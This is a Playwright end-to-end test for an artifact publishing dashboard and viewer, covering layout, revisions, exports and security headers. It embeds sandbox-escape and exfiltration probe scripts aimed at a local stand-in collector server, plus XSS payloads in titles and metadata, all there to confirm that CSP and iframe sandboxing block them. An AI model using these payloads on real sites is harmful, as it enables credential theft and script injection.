import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import { randomBytes } from 'node:crypto';
import { once } from 'node:events';
import { mkdir, readFile, writeFile } from 'node:fs/promises';
import { createServer } from 'node:net';
import { createServer as createHttpServer } from 'node:http';
import { serve } from '@hono/node-server';
import { eq } from 'drizzle-orm';
import { unzipSync, strFromU8 } from 'fflate';
import { chromium, type Browser, type Page } from 'playwright';
import { createArtifactStore } from '../packages/artifacts/src/index.ts';
import { artifactCommand, session } from '../packages/db/src/schema.ts';
import { createPublicationApp } from '../apps/publication/src/http.ts';
import { publishSelectedRevision } from '../apps/dashboard/src/publish.ts';
import { fixture } from './helpers.ts';

async function assertPreviewInViewport(page: Page) {
  await page.evaluate(() => scrollTo(0, 0));
  const bounds = await page.locator('.preview').evaluate((frame) => {
    const box = frame.getBoundingClientRect();
    return { top: box.top, visibleHeight: Math.min(box.bottom, innerHeight) - Math.max(box.top, 0) };
  });
  assert(bounds.top >= 0 && bounds.visibleHeight >= 180, 'The selected preview must begin in the initial viewport with usable height');
}

async function assertDetailHeaders(page: Page) {
  assert.equal(await page.locator('header').count(), 2, 'Detail renders the workspace header and artifact toolbar');
  assert.equal(await page.locator('header.workspace-toolbar').count(), 1, 'Detail has one shared shell header');
  assert.equal(await page.locator('header.detail-header').count(), 1, 'Detail has one artifact toolbar');
  assert.equal(await page.locator('header.workspace-toolbar').getByRole('navigation', { name: 'Ruta', exact: true }).count(), 1);
  assert.equal(await page.locator('header.workspace-toolbar').getByRole('search').count(), 1);
  assert.equal(await page.locator('h1').count(), 1);
}

async function assertViewerBounds(page: Page) {
  const bounds = await page.evaluate(() => {
    const [header, frame, home, project, title, revision, disclosure] = ['header', 'main > iframe', '.home', '.project-navigation > a', '.title-menu > summary', '.revision', '.title-menu[open] .disclosures'].map((selector) => {
      const element = document.querySelector(selector);
      if (!element) return null;
      const rect = element.getBoundingClientRect();
      return { left: rect.left, right: rect.right, top: rect.top, bottom: rect.bottom, width: rect.width, height: rect.height, centerY: (rect.top + rect.bottom) / 2 };
    });
    return { height: innerHeight, width: innerWidth, header: header!, frame: frame!, home: home!, project, title: title!, revision: revision!, disclosure, scrollHeight: document.documentElement.scrollHeight, scrollWidth: document.documentElement.scrollWidth };
  });
  assert(bounds.header.height <= 60, 'The viewer header must remain one compact row even when its menu opens');
  assert(bounds.frame.height >= bounds.height - 60 && bounds.frame.bottom <= bounds.height + 1 && bounds.frame.top >= 0, 'The viewer frame must fill the usable remainder of the viewport');
  assert(bounds.scrollHeight <= bounds.height + 1 && bounds.scrollWidth <= bounds.width + 1, 'The viewer wrapper must stay within its viewport');
  assert(bounds.home.width >= 44 && bounds.home.height >= 44 && bounds.title.height >= 44, 'Home and the title menu must keep 44px touch targets');
  assert(bounds.home.left >= 0 && bounds.home.right <= bounds.title.left && bounds.title.width > 0 && bounds.title.right <= bounds.revision.left && bounds.revision.right <= bounds.width, 'Home, title menu and revision must fit without overlap');
  assert(Math.abs(bounds.home.centerY - bounds.title.centerY) <= 1 && Math.abs(bounds.home.centerY - bounds.revision.centerY) <= 1, 'Home, title and revision must share one row');
  if (bounds.project) {
    assert(bounds.project.width >= 44 && bounds.project.height >= 44, 'The current project must keep a 44px touch target');
    assert(bounds.home.right <= bounds.project.left && bounds.project.right <= bounds.title.left && Math.abs(bounds.home.centerY - bounds.project.centerY) <= 1, 'The project must fit between home and title on the same row');
  }
  if (bounds.disclosure) {
    assert(bounds.disclosure.top >= bounds.header.bottom && bounds.disclosure.bottom <= bounds.height && bounds.disclosure.left >= 0 && bounds.disclosure.right <= bounds.width, 'The title menu overlay must remain inside the viewport without resizing the header');
  }
}

const reservation = createServer().listen(0, '127.0.0.1');
await once(reservation, 'listening');
const address = reservation.address();
assert(address && typeof address === 'object');
await new Promise<void>((resolve) => reservation.close(() => resolve()));
const dashboard = `http://localhost:${address.port}`;
let publicationHandler = async (_request: Request) => new Response(null, { status: 503 });
const publicationServer = serve({ fetch: (request) => publicationHandler(request), hostname: '::1', port: 0 });
await once(publicationServer, 'listening');
const publicationAddress = publicationServer.address();
assert(publicationAddress && typeof publicationAddress === 'object');
const publish = `http://[::1]:${publicationAddress.port}`;
const app = await fixture({ dashboard, allowGuests: true });
const collected: string[] = [];
const collector = createHttpServer((request, response) => { collected.push(request.url ?? ''); response.end('Collected'); }).listen(0, '127.0.0.1');
await once(collector, 'listening');
const collectorAddress = collector.address();
assert(collectorAddress && typeof collectorAddress === 'object');
const collectorUrl = `http://127.0.0.1:${collectorAddress.port}/collect?bytes=retained-document`;
const collectorOrigin = new URL(collectorUrl).origin;
const serviceSecret = randomBytes(32).toString('hex');
const cookieSecret = randomBytes(32).toString('hex');
publicationHandler = createPublicationApp({ DASHBOARD_URL: dashboard, PUBLISH_URL: publish, PUBLICATION_SERVICE_SECRET: serviceSecret, PUBLICATION_COOKIE_SECRET: cookieSecret });
const store = createArtifactStore(app.db, { access: app.config.access, publishOrigin: publish });
const central = await app.db.select().from(session).where(eq(session.userId, app.ownerId)).get();
assert(central);
const actor = { userId: app.ownerId, sessionId: central.id, clientId: 'claude-fixture', scopes: ['artifacts:read', 'artifacts:write', 'artifacts:publish'] };
const originalText = '<h1>Original document</h1><p>Revision one survives later publication.</p>';
const originalBytes = Buffer.concat([Buffer.from([0, 1, 255]), Buffer.from('<script>window.top.document.body.dataset.attachmentExecuted = "yes"</script>')]);
const created = await store.create(actor, { requestId: randomBytes(16).toString('hex'), snapshot: { metadata: { title: 'Browser proof artifact', description: 'Complete retained snapshots', custom: { retained: true } }, content: { kind: 'html', text: originalText }, files: [{ path: 'nested/file.html', mediaType: 'text/html', encoding: 'base64', data: originalBytes.toString('base64') }] } });
const firstPublication = await store.publish(actor, { requestId: randomBytes(16).toString('hex'), artifactId: created.artifactId, revisionId: created.revision.id, expectedPublicationVersion: 0 });
const client = await app.auth.api.adminCreateOAuthClient({ headers: new Headers({ cookie: app.cookie }), body: { client_name: 'Artifact proof dashboard', application_type: 'native', redirect_uris: [`${dashboard}/auth/callback`], token_endpoint_auth_method: 'client_secret_basic', grant_types: ['authorization_code'], response_types: ['code'], scope: 'openid profile', enable_end_session: true, skip_consent: true, require_pkce: true } });
assert(client.client_secret);
const child = spawn(process.execPath, ['apps/dashboard/dist/server/entry.mjs'], {
  env: { PATH: process.env.PATH, OWNER_EMAIL: app.config.access.ownerEmail, ALLOW_GUEST_ACCESS: String(app.config.access.allowGuests), DATABASE_URL: app.databaseUrl, DATABASE_AUTH_TOKEN: '', AUTH_URL: app.config.origin, MCP_URL: app.config.resource, DASHBOARD_URL: dashboard, PUBLISH_URL: publish, PUBLICATION_SERVICE_SECRET: serviceSecret, PUBLICATION_COOKIE_SECRET: cookieSecret, PANEL_CLIENT_ID: client.client_id, PANEL_CLIENT_SECRET: client.client_secret, PORT: String(address.port), HOST: '127.0.0.1' },
  stdio: ['ignore', 'pipe', 'pipe'],
});
let startupError = '';
child.stderr.on('data', (data: Buffer) => { startupError += data.toString(); });
let browser: Browser | undefined;
try {
  let ready = false;
  for (let attempt = 0; attempt < 50; attempt++) {
    if (child.exitCode !== null) throw new Error(`Dashboard startup failed: ${startupError.slice(0, 300)}`);
    ready = await fetch(dashboard).then((response) => response.ok).catch(() => false);
    if (ready) break;
    await new Promise((resolve) => setTimeout(resolve, 100));
  }
  assert(ready, `Built panel starts: ${startupError.slice(0, 300)}`);
  const deniedService = await fetch(`${dashboard}/internal/publication/read`, { method: 'POST', headers: { origin: dashboard, 'content-type': 'application/json' }, body: '{}' });
  assert.equal(deniedService.status, 403);
  const deniedWithBrowserOrigin = await fetch(`${dashboard}/internal/publication/consume`, { method: 'POST', headers: { origin: dashboard, authorization: 'Bearer incorrect', 'content-type': 'application/json' }, body: '{}' });
  assert.equal(deniedWithBrowserOrigin.status, 403);
  for (const endpoint of ['read', 'consume']) {
    const deniedAlias = await fetch(`${dashboard}/internal/publication/${endpoint}/`, { method: 'POST', headers: { origin: dashboard, 'content-type': 'application/json' }, body: '{}' });
    assert.equal(deniedAlias.status, 403);
  }
  const authenticatedWithoutOrigin = await fetch(`${dashboard}/internal/publication/read`, { method: 'POST', headers: { authorization: `Bearer ${serviceSecret}`, 'content-type': 'application/json' }, body: '{}' });
  assert.equal(authenticatedWithoutOrigin.status, 400);
  browser = await chromium.launch(process.env.CHROME_EXECUTABLE ? { executablePath: process.env.CHROME_EXECUTABLE } : { channel: 'chrome' });
  const context = await browser.newContext({ viewport: { width: 1280, height: 900 } });
  const page = await context.newPage();
  const callbackRequest = page.waitForRequest((request) => new URL(request.url()).origin === publish && new URL(request.url()).pathname === '/callback');
  await page.goto(firstPublication.url);
  await page.getByLabel('Correo electrónico').fill('owner@example.test');
  await page.getByLabel('Contraseña').fill(app.password);
  await page.getByRole('button', { name: 'Iniciar sesión', exact: true }).click();
  await page.waitForURL(firstPublication.url);
  await page.frameLocator('iframe').getByRole('heading', { name: 'Original document', exact: true }).waitFor();
  assert.equal(await page.locator('main').getAttribute('data-artifact-id'), created.artifactId);
  assert.equal(await page.locator('main').getAttribute('data-revision-id'), created.revision.id);
  assert.equal(await page.locator('main').getAttribute('data-revision-sha256'), created.revision.sha256);
  assert.equal(await page.locator('main').getAttribute('data-publication-version'), '1');
  assert.equal(new URL(page.url()).search, '');
  const viewerCookies = (await context.cookies(publish)).filter((cookie) => cookie.name.startsWith('__Host-artifacts-viewer-'));
  assert.equal(viewerCookies.length, 1);
  assert(viewerCookies[0]!.httpOnly && viewerCookies[0]!.secure);
  assert.equal(viewerCookies[0]!.domain, '[::1]');
  assert(!(await context.cookies(publish)).some((cookie) => cookie.name.includes('transaction')));
  const callback = await callbackRequest;
  const callbackUrl = callback.url();
  const transactionCookie = await callback.headerValue('cookie');
  assert(transactionCookie);
  assert.equal((await fetch(callbackUrl, { headers: { cookie: transactionCookie }, redirect: 'manual' })).status, 403);
  assert.equal((await fetch(callbackUrl, { redirect: 'manual' })).status, 403);
  assert.equal(await page.getByRole('navigation', { name: 'Proyecto', exact: true }).count(), 0);
  for (const width of [1280, 390, 320]) {
    await page.setViewportSize({ width, height: 900 });
    await assertViewerBounds(page);
  }
  await page.setViewportSize({ width: 1280, height: 900 });
  const home = page.getByRole('link', { name: 'Volver a la biblioteca', exact: true });
  assert.equal(await home.getAttribute('href'), `${dashboard}/`);
  await home.click();
  await page.waitForURL(`${dashboard}/`);
  await page.getByRole('heading', { name: 'Biblioteca', exact: true }).waitFor();
  await page.getByRole('link', { name: 'Browser proof artifact', exact: true }).waitFor();
  await page.goto(firstPublication.url);
  await page.frameLocator('iframe').getByRole('heading', { name: 'Original document', exact: true }).waitFor();
  for (const project of ['Diseño & "QA" + 50%/β', 'Next project']) {
    await store.move(actor, { requestId: randomBytes(16).toString('hex'), artifactId: created.artifactId, project });
    await page.reload();
    await page.frameLocator('iframe').getByRole('heading', { name: 'Original document', exact: true }).waitFor();
    assert.equal(await page.locator('main').getAttribute('data-revision-id'), created.revision.id);
    assert.equal(await page.locator('main').getAttribute('data-publication-version'), '1');
    const projectLink = page.getByRole('link', { name: `Volver al proyecto ${project}`, exact: true });
    const destination = new URL((await projectLink.getAttribute('href'))!);
    assert.equal(destination.origin, dashboard);
    assert.equal(destination.pathname, '/');
    assert.equal(destination.searchParams.get('project'), project);
    await projectLink.click();
    await page.getByRole('heading', { name: project, exact: true }).waitFor();
    assert.equal(new URL(page.url()).searchParams.get('project'), project);
    await page.getByRole('link', { name: 'Browser proof artifact', exact: true }).waitFor();
    await page.goto(firstPublication.url);
    await page.frameLocator('iframe').getByRole('heading', { name: 'Original document', exact: true }).waitFor();
  }
  await store.move(actor, { requestId: randomBytes(16).toString('hex'), artifactId: created.artifactId, project: null });
  await page.reload();
  await page.frameLocator('iframe').getByRole('heading', { name: 'Original document', exact: true }).waitFor();
  assert.equal(await page.getByRole('navigation', { name: 'Proyecto', exact: true }).count(), 0);
  await page.locator('.title-menu > summary').press('Enter');
  await page.locator('.title-menu[open]').waitFor();
  await page.locator('summary').filter({ hasText: /^Archivos \(/ }).press('Enter');
  await page.locator('.files[open]').waitFor();
  const oldAttachment = new URL((await page.getByRole('link', { name: 'nested/file.html', exact: true }).getAttribute('href'))!, publish).href;
  const downloadEvent = page.waitForEvent('download');
  await page.getByRole('link', { name: 'nested/file.html', exact: true }).click();
  const download = await downloadEvent;
  await mkdir('.test-artifacts', { recursive: true });
  await download.saveAs('.test-artifacts/publication-file.bin');
  assert.deepEqual(await readFile('.test-artifacts/publication-file.bin'), originalBytes);
  assert.equal(await page.locator('body').getAttribute('data-attachment-executed'), null);
  const html = `<h1>Updated document</h1><button id="navigate">Navigation probe</button><pre id="proof">pending</pre><pre id="violations"></pre><script>
  document.addEventListener('securitypolicyviolation', (event) => { document.getElementById('violations').textContent += JSON.stringify({ directive: event.effectiveDirective, uri: event.blockedURI }) + '\\n'; });
  document.getElementById('navigate').onclick = () => { location.href = ${JSON.stringify(collectorUrl)}; };
  (async () => {
    const results = {};
    try { parent.document.body.dataset.escaped = 'yes'; results.parent = 'allowed'; } catch { results.parent = 'blocked'; }
    try { results.cookies = document.cookie ? 'allowed' : 'empty'; } catch { results.cookies = 'blocked'; }
    try { localStorage.setItem('escape', 'yes'); results.storage = 'allowed'; } catch { results.storage = 'blocked'; }
    for (const [name, url] of [['authenticatedFetch', ${JSON.stringify(`${dashboard}/artifacts/${created.artifactId}/export?revisionId=${created.revision.id}`)}], ['externalFetch', ${JSON.stringify(`${collectorOrigin}/fetch`)}]]) {
      try { await fetch(url, { credentials: 'include' }); results[name] = 'allowed'; } catch { results[name] = 'blocked'; }
    }
    await new Promise((resolve) => {
      try {
        const worker = new Worker('data:text/javascript,postMessage(1)');
        worker.onmessage = () => { results.worker = 'allowed'; worker.terminate(); resolve(); };
        worker.onerror = (event) => { event.preventDefault(); results.worker = 'blocked'; worker.terminate(); resolve(); };
      } catch { results.worker = 'blocked'; resolve(); }
    });
    results.popup = window.open(${JSON.stringify(`${collectorOrigin}/popup`)}) ? 'allowed' : 'blocked';
    try { top.location = ${JSON.stringify(`${collectorOrigin}/escape`)}; results.top = 'allowed'; } catch { results.top = 'blocked'; }
    const image = new Image(); image.src = ${JSON.stringify(`${collectorOrigin}/image`)}; document.body.append(image);
    const script = document.createElement('script'); script.src = ${JSON.stringify(`${collectorOrigin}/script`)}; document.body.append(script);
    const form = document.createElement('form'); form.action = ${JSON.stringify(`${collectorOrigin}/form`)}; document.body.append(form); form.submit();
    const frame = document.createElement('iframe'); frame.src = ${JSON.stringify(`${collectorOrigin}/frame`)}; document.body.append(frame);
    parent.postMessage({ type: 'read-credentials', url: ${JSON.stringify(`${collectorOrigin}/message`)} }, '*');
    document.getElementById('proof').textContent = JSON.stringify(results);
  })();
  </script>`;
  const updated = await store.update({ ...actor, clientId: 'codex-fixture' }, { requestId: randomBytes(16).toString('hex'), artifactId: created.artifactId, expectedRevisionId: created.revision.id, snapshot: { metadata: { title: 'Browser proof artifact', description: 'Second complete snapshot' }, content: { kind: 'html', text: html }, files: [{ path: 'nested/file.html', mediaType: 'text/html', encoding: 'utf8', data: '<h1>Second attachment</h1>' }] } });
  const secondPublication = await store.publish({ ...actor, clientId: 'codex-fixture' }, { requestId: randomBytes(16).toString('hex'), artifactId: created.artifactId, revisionId: updated.revision.id, expectedPublicationVersion: firstPublication.version });
  assert.equal(secondPublication.url, firstPublication.url);
  const forbiddenRequests: string[] = [];
  page.on('requestfinished', (request) => { if (request.url().startsWith(collectorOrigin) || request.url().startsWith(`${dashboard}/artifacts/`)) forbiddenRequests.push(request.url()); });
  const contentLoaded = page.waitForResponse((response) => response.url() === `${publish}/a/${created.artifactId}/r/${updated.revision.id}/content`);
  const publishedResponse = await page.goto(secondPublication.url);
  assert.equal(publishedResponse?.status(), 200);
  assert.equal(publishedResponse?.headers()['cache-control'], 'private, no-store');
  assert.equal(publishedResponse?.headers()['connection-allowlist'], undefined);
  assert.equal(publishedResponse?.headers()['cross-origin-opener-policy'], 'same-origin');
  const servedContent = await contentLoaded;
  assert.equal(servedContent.status(), 200);
  assert.equal(servedContent.headers()['connection-allowlist'], '()');
  assert.equal(servedContent.headers()['cross-origin-opener-policy'], 'same-origin');
  assert.match(servedContent.headers()['content-security-policy']!, /frame-ancestors 'self'; sandbox allow-scripts$/);
  await page.frameLocator('iframe').getByRole('heading', { name: 'Updated document', exact: true }).waitFor();
  await page.frameLocator('iframe').locator('#proof').filter({ hasText: 'blocked' }).waitFor();
  const results = JSON.parse((await page.frameLocator('iframe').locator('#proof').textContent())!) as Record<string, string>;
  assert.deepEqual(results, { parent: 'blocked', cookies: 'blocked', storage: 'blocked', authenticatedFetch: 'blocked', externalFetch: 'blocked', worker: 'blocked', popup: 'blocked', top: 'blocked' });
  await page.frameLocator('iframe').locator('#violations').filter({ hasText: 'script-src-elem' }).waitFor();
  const violations = (await page.frameLocator('iframe').locator('#violations').textContent())!.trim().split('\n').map((line) => JSON.parse(line) as { directive: string; uri: string });
  assert(violations.some((event) => event.directive === 'connect-src' && event.uri.startsWith(`${dashboard}/artifacts/`)));
  assert(violations.some((event) => event.directive === 'connect-src' && event.uri === `${collectorOrigin}/fetch`));
  assert(violations.some((event) => event.directive === 'worker-src'));
  assert(violations.some((event) => event.directive === 'img-src'));
  assert(violations.some((event) => event.directive === 'frame-src'));
  assert.deepEqual(forbiddenRequests, []);
  assert.equal(await page.locator('iframe').getAttribute('sandbox'), 'allow-scripts');
  assert.equal(await page.locator('body').getAttribute('data-escaped'), null);
  assert.equal(page.url(), secondPublication.url);
  await page.frameLocator('iframe').getByRole('button', { name: 'Navigation probe', exact: true }).click();
  await page.waitForTimeout(100);
  assert.deepEqual(collected, []);
  const viewerHeader = viewerCookies.map((cookie) => `${cookie.name}=${cookie.value}`).join('; ');
  assert.equal((await fetch(oldAttachment, { headers: { cookie: viewerHeader }, redirect: 'manual' })).status, 403);
  await page.locator('.title-menu > summary').click();
  await page.locator('summary').filter({ hasText: /^Archivos \(/ }).click();
  const attachment = new URL((await page.getByRole('link', { name: 'nested/file.html', exact: true }).getAttribute('href'))!, publish).href;
  const currentDownload = await fetch(attachment, { headers: { cookie: viewerHeader } });
  assert.equal(currentDownload.status, 200);
  assert.equal(await currentDownload.text(), '<h1>Second attachment</h1>');
  assert.match(currentDownload.headers.get('content-disposition')!, /^attachment;/);
  assert.equal(currentDownload.headers.get('x-content-type-options'), 'nosniff');
  const panel = await context.newPage();
  await panel.goto(dashboard);
  await panel.getByRole('link', { name: 'Browser proof artifact', exact: true }).click();
  await panel.getByRole('heading', { name: 'Historial', exact: true }).waitFor();
  const panelResponse = await context.request.get(panel.url());
  assert.equal(panelResponse.headers()['cross-origin-opener-policy'], 'same-origin');
  const panelPolicy = panelResponse.headers()['content-security-policy'];
  assert.match(panelPolicy, /script-src 'self' 'sha256-/);
  assert.match(panelPolicy, /script-src-attr 'none'/);
  assert(!/script-src[^;]*'unsafe-inline'/.test(panelPolicy));
  for (const restriction of ["default-src 'self'", "style-src 'self' 'unsafe-inline'", "frame-src 'self'", "connect-src 'self'", "object-src 'none'", "base-uri 'none'", "form-action 'self'", "frame-ancestors 'none'"]) assert(panelPolicy.includes(restriction));
  const titleTrigger = panel.getByRole('button', { name: 'Menú de Browser proof artifact', exact: true });
  await titleTrigger.focus();
  await titleTrigger.press('Enter');
  await panel.getByRole('menu').waitFor();
  await panel.waitForFunction(() => document.activeElement?.textContent === 'Descargar revisión 2');
  assert.equal(await panel.getByRole('menuitem', { name: 'Descargar revisión 2', exact: true }).evaluate((item) => item === document.activeElement), true);
  await panel.keyboard.press('ArrowDown');
  assert.equal(await panel.getByRole('menuitem', { name: 'Mover a proyecto', exact: true }).evaluate((item) => item === document.activeElement), true);
  await panel.keyboard.press('Escape');
  await panel.getByRole('menu').waitFor({ state: 'hidden' });
  assert.equal(await titleTrigger.evaluate((trigger) => trigger === document.activeElement), true);
  for (const [label, tab, target] of [['Información', 'information', '#information'], ['Archivos', 'files', '#files'], ['Comparar', 'compare', '#comparison'], ['Vista previa', 'preview', '.preview']]) {
    await Promise.all([panel.waitForURL((url) => (url.searchParams.get('tab') ?? 'preview') === tab), panel.locator('.detail-tabs').getByRole('link', { name: label, exact: label !== 'Archivos' }).press('Enter')]);
    await panel.locator(target).waitFor();
    assert.equal(new URL(panel.url()).searchParams.get('revisionId'), updated.revision.id);
    assert.equal(await panel.locator('.detail-tabs [aria-current=page]').count(), 1);
  }
  await panel.evaluate(() => scrollTo(0, 0));
  assert.equal(await panel.locator('.publish-form').count(), 0, 'The currently published selection must not offer redundant publication');
  assert.equal(await panel.locator('.detail-header').getByRole('link', { name: 'Abrir publicación', exact: true }).getAttribute('href'), secondPublication.url);
  assert.equal(await panel.locator('.detail-header').locator('[data-variant=primary]').innerText(), 'Abrir publicación');
  assert.equal(await panel.locator('.artifact-detail').getAttribute('data-revision-id'), updated.revision.id);
  await assertPreviewInViewport(panel);
  await panel.screenshot({ path: '.test-artifacts/artifact-published-desktop.png' });
  await Promise.all([panel.waitForURL(secondPublication.url), panel.locator('.detail-header').getByRole('link', { name: 'Abrir publicación', exact: true }).click()]);
  await panel.frameLocator('main > iframe').getByRole('heading', { name: 'Updated document', exact: true }).waitFor();
  assert.equal(await panel.locator('main').getAttribute('data-artifact-id'), created.artifactId);
  assert.equal(await panel.locator('main').getAttribute('data-revision-id'), updated.revision.id);
  assert.equal(await panel.locator('main').getAttribute('data-revision-sha256'), updated.revision.sha256);
  assert.equal(await panel.locator('main').getAttribute('data-publication-version'), '2');
  await panel.goto(`${dashboard}/artifacts/${created.artifactId}`);
  await panel.getByRole('heading', { name: 'Historial', exact: true }).waitFor();
  assert.equal(await panel.locator('.revision-list li').count(), 2);
  assert(await panel.getByRole('link', { name: 'Ver revisión 1', exact: true }).count());
  assert(await panel.getByRole('link', { name: 'Ver revisión 2', exact: true }).count());
  assert.match((await panel.request.get(panel.url())).headers()['content-security-policy']!, /frame-src 'self'/);
  await panel.frameLocator('.preview').getByRole('button', { name: 'Navigation probe', exact: true }).click();
  await panel.waitForTimeout(100);
  assert.deepEqual(collected, []);
  const directPreview = await context.newPage();
  const previewDenied = await directPreview.goto(`${dashboard}/artifacts/${created.artifactId}/preview?revisionId=${updated.revision.id}`);
  assert.equal(previewDenied?.status(), 403);
  assert.equal(await directPreview.locator('script').count(), 0);
  await directPreview.close();
  await Promise.all([panel.waitForURL((url) => url.searchParams.get('revisionId') === created.revision.id), panel.getByRole('link', { name: 'Ver revisión 1', exact: true }).press('Enter')]);
  await panel.frameLocator('.preview').getByRole('heading', { name: 'Original document', exact: true }).waitFor();
  assert.equal(await panel.locator('.artifact-detail').getAttribute('data-revision-id'), created.revision.id);
  assert.equal(new URL((await panel.locator('.preview').getAttribute('src'))!, dashboard).searchParams.get('revisionId'), created.revision.id);
  await panel.getByRole('button', { name: 'Menú de Browser proof artifact', exact: true }).click();
  const exportEvent = panel.waitForEvent('download');
  await panel.getByRole('menuitem', { name: 'Descargar revisión 1', exact: true }).click();
  const archive = await exportEvent;
  await archive.saveAs('.test-artifacts/revision-one.zip');
  const members = unzipSync(await readFile('.test-artifacts/revision-one.zip'));
  assert.equal(strFromU8(members['content.html']!), originalText);
  assert.deepEqual(Buffer.from(members['files/nested/file.html']!), originalBytes);
  const manifest = JSON.parse(strFromU8(members['artifact.json']!)) as { artifactId: string; revision: { id: string }; metadata: { custom: { retained: boolean } } };
  assert.equal(manifest.artifactId, created.artifactId);
  assert.equal(manifest.revision.id, created.revision.id);
  assert.equal(manifest.metadata.custom.retained, true);
  await panel.setViewportSize({ width: 390, height: 844 });
  await panel.evaluate(async () => {
    await document.fonts.ready;
    await new Promise<void>((resolve) => requestAnimationFrame(() => requestAnimationFrame(() => resolve())));
  });
  await assertDetailHeaders(panel);
  assert(await panel.evaluate(() => document.documentElement.scrollWidth <= innerWidth));
  await assertPreviewInViewport(panel);
  await panel.screenshot({ path: '.test-artifacts/artifact-history-mobile.png' });
  const reviewOne = await store.create(actor, {
    requestId: randomBytes(16).toString('hex'),
    snapshot: {
      metadata: { title: 'Review <img src=x onerror="document.body.dataset.reviewEscaped=1">', description: 'Original review description', custom: { unsafe: '<script>document.body.dataset.reviewEscaped=1</script>', retained: true } },
      content: { kind: 'html', text: '<h1>Saved review one</h1><p>Retained source.</p>' },
      files: [
        { path: 'changed.bin', mediaType: 'application/octet-stream', encoding: 'base64', data: 'AAE=' },
        { path: 'encoding.txt', mediaType: 'text/plain', encoding: 'utf8', data: 'same bytes' },
        { path: 'removed.txt', mediaType: 'text/plain', encoding: 'utf8', data: 'removed' },
        { path: 'unsafe"&<img>.txt', mediaType: 'text/plain', encoding: 'utf8', data: 'escaped path' },
      ],
    },
  });
  const reviewUrl = `${dashboard}/artifacts/${reviewOne.artifactId}`;
  const publishUrl = `${reviewUrl}/publish`;
  await panel.setViewportSize({ width: 1280, height: 900 });
  await panel.goto(`${reviewUrl}?revisionId=${reviewOne.revision.id}`);
  assert.equal(await panel.locator('.artifact-detail').getAttribute('data-publication-version'), '0');
  assert.equal(await panel.locator('.detail-header h1').innerText(), reviewOne.revision.snapshot.metadata.title);
  assert.equal(await panel.locator('.detail-header img, .detail-header [onerror], .detail-header [onclick]').count(), 0);
  const hostileTrigger = panel.getByRole('button', { name: `Menú de ${reviewOne.revision.snapshot.metadata.title}`, exact: true });
  await hostileTrigger.press('Enter');
  await panel.getByRole('menu').waitFor();
  assert.equal(await hostileTrigger.getAttribute('aria-label'), `Menú de ${reviewOne.revision.snapshot.metadata.title}`);
  assert.equal(await panel.locator('.artifact-menu-heading > span').first().innerText(), reviewOne.revision.snapshot.metadata.title);
  assert.equal(await panel.locator('.artifact-menu img, .artifact-menu script, .artifact-menu [onerror], .artifact-menu [onclick]').count(), 0);
  assert.equal(await panel.locator('body').getAttribute('data-review-escaped'), null);
  await panel.keyboard.press('Escape');
  await panel.getByRole('menu').waitFor({ state: 'hidden' });
  assert.equal(await panel.getByLabel('Revisión seleccionada', { exact: true }).inputValue(), reviewOne.revision.id);
  assert.equal(await panel.locator('.selected-publication').innerText(), 'Sin publicar');
  await panel.locator('.detail-tabs').getByRole('link', { name: 'Comparar', exact: true }).press('Enter');
  await panel.locator('#comparison').waitFor();
  const singleRevisionComparison = {
    forms: await panel.locator('.compare-form').count(),
    selectors: await panel.getByLabel('Comparar la seleccionada con', { exact: true }).count(),
    comparisons: await panel.locator('.content-comparison').count(),
    emptyState: await panel.getByText('No hay otra revisión disponible para comparar.', { exact: true }).count(),
    selfLinks: await panel.getByRole('link', { name: 'Comparar con revisión 1', exact: true }).count(),
    publicationNotice: await panel.getByText('Publicar crea un enlace protegido a la revisión seleccionada y sus archivos. El acceso requiere iniciar sesión como propietario o con un correo al que hayas dado acceso.', { exact: true }).count(),
  };
  await panel.screenshot({ path: '.test-artifacts/artifact-comparison-single.png', fullPage: true });
  const unpublishedOne = await store.create(actor, { requestId: randomBytes(16).toString('hex'), snapshot: reviewOne.revision.snapshot });
  const unpublishedTwo = await store.update(actor, { requestId: randomBytes(16).toString('hex'), artifactId: unpublishedOne.artifactId, expectedRevisionId: unpublishedOne.revision.id, snapshot: { ...unpublishedOne.revision.snapshot, content: { kind: 'text', text: 'Second unpublished revision' } } });
  const unpublishedUrl = `${dashboard}/artifacts/${unpublishedOne.artifactId}`;
  await panel.goto(`${unpublishedUrl}?tab=compare`);
  const unpublishedComparison = {
    selected: await panel.locator('.artifact-detail').getAttribute('data-revision-id'),
    target: await panel.getByLabel('Comparar la seleccionada con', { exact: true }).inputValue(),
    options: await panel.locator('#compareTo option').evaluateAll((options) => options.map((option) => (option as HTMLOptionElement).value)),
    contents: await panel.locator('.content-comparison pre').allTextContents(),
  };
  await panel.screenshot({ path: '.test-artifacts/artifact-comparison-unpublished.png', fullPage: true });
  assert.deepEqual({ singleRevisionComparison, unpublishedComparison }, {
    singleRevisionComparison: { forms: 0, selectors: 0, comparisons: 0, emptyState: 1, selfLinks: 0, publicationNotice: 1 },
    unpublishedComparison: { selected: unpublishedTwo.revision.id, target: unpublishedOne.revision.id, options: [unpublishedOne.revision.id], contents: [unpublishedOne.revision.snapshot.content.text, unpublishedTwo.revision.snapshot.content.text] },
  });
  await Promise.all([panel.waitForURL((url) => url.searchParams.get('compareTo') === unpublishedOne.revision.id), panel.getByRole('button', { name: 'Comparar', exact: true }).press('Enter')]);
  assert.equal(new URL(panel.url()).searchParams.get('revisionId'), unpublishedTwo.revision.id);
  assert.equal(new URL(panel.url()).searchParams.get('compareTo'), unpublishedOne.revision.id);
  await Promise.all([panel.waitForURL((url) => url.searchParams.get('revisionId') === unpublishedOne.revision.id), panel.getByRole('link', { name: 'Ver revisión 1', exact: true }).press('Enter')]);
  assert.equal(new URL(panel.url()).searchParams.get('compareTo'), null);
  assert.equal(await panel.getByLabel('Comparar la seleccionada con', { exact: true }).inputValue(), unpublishedTwo.revision.id);
  assert.deepEqual(await panel.locator('#compareTo option').evaluateAll((options) => options.map((option) => (option as HTMLOptionElement).value)), [unpublishedTwo.revision.id]);
  await panel.goto(`${unpublishedUrl}?before=1&tab=compare`);
  assert.equal(await panel.locator('.revision-list li').count(), 0);
  assert.equal(await panel.getByLabel('Comparar la seleccionada con', { exact: true }).inputValue(), unpublishedOne.revision.id);
  await panel.goto(`${unpublishedUrl}?revisionId=${unpublishedTwo.revision.id}&compareTo=${unpublishedTwo.revision.id}&tab=compare`);
  assert.equal(await panel.getByLabel('Comparar la seleccionada con', { exact: true }).inputValue(), unpublishedOne.revision.id);
  assert.equal(await panel.locator('.content-comparison pre').first().innerText(), unpublishedOne.revision.snapshot.content.text);
  assert.equal(await panel.locator('.content-comparison pre').last().innerText(), unpublishedTwo.revision.snapshot.content.text);
